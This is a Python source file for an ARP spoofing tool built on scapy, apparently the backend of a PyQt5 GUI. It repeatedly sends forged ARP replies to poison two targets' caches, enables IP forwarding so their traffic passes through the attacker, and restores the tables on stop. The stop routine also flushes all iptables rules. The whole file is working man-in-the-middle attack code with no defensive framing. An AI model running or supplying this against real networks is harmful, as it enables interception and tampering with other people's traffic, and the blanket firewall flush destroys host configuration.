import time
import subprocess

import scapy.all as scapy

from PyQt5.QtCore import QMutex


class ARPSpoofer:
    def __init__(self, target1, target2, output):
        self.target1 = target1
        self.target2 = target2
        self.output = output
        self.keep_running = False

    def get_mac(self, target_ip):
        try:
            arp_request = scapy.ARP(pdst=target_ip)
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            answered = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

            return answered[0][1].hwsrc
        except IndexError:
            self.output.append("[-] Error spoofing target: " + target_ip)
            self.keep_running = False

    def spoof_target(self, target_ip, spoof_ip):
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=self.get_mac(target_ip), psrc=spoof_ip)
        scapy.send(packet, verbose=False)

    def restore_target(self, destination_ip, source_ip):
        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=self.get_mac(destination_ip), psrc=source_ip,
                           hwsrc=self.get_mac(source_ip))
        scapy.send(packet, verbose=False)

    def restore(self):
        self.output.append("[+] Restoring tables...")
        self.restore_target(self.target1, self.target2)
        self.restore_target(self.target2, self.target1)

    def stop_spoofing(self):
        subprocess.call("echo 0 > /proc/sys/net/ipv4/ip_forward", shell=True)
        subprocess.call("iptables --flush", shell=True)
        self.keep_running = False
        self.restore()

    def spoof(self):
        self.keep_running = True
        subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
        self.output.append("[+] Spoofer started")
        try:
            while self.keep_running:
                self.spoof_target(self.target1, self.target2)
                self.spoof_target(self.target2, self.target1)
                time.sleep(2)
        except KeyboardInterrupt:
            self.restore_target(self.target1, self.target2)
            self.restore_target(self.target2, self.target1)
